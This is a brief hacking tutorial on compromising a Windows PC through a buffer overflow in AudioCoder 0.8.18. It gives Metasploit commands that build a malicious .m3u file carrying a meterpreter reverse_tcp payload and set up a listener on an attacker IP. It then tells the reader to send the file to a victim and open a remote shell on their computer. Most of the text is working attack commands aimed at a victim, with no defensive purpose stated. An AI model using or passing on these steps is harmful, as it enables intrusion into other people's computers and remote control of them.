Hack Windows PC using AudioCoder .M3U Buffer Overflow

This module exploits a buffer overflow in Audio Code 0.8.18. The vulnerability occurs when adding an .m3u, allowing arbitrary code execution with the privileges of the user running AudioCoder. This module has been tested successfully on AudioCoder 0.8.18.5353 over Windows XP SP3 and Windows 7 SP1.
Audio Code 0.8.18
Attacker: Backtrack 5
Victim PC: Windows 7
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/audio_coder_m3u
msf exploit (audio_coder_m3u)>set payload windows/meterpreter/reverse_tcp
msf exploit (audio_coder_m3u)>set lhost 192.168.1.3 (IP of Local Host)
msf exploit (audio_coder_m3u)>exploit

After we successfully generate the malicious m3u File, it will stored on your local computer
/root/.msf4/local/msf.m3u

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.3
exploit
Now send your msf.m3u files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
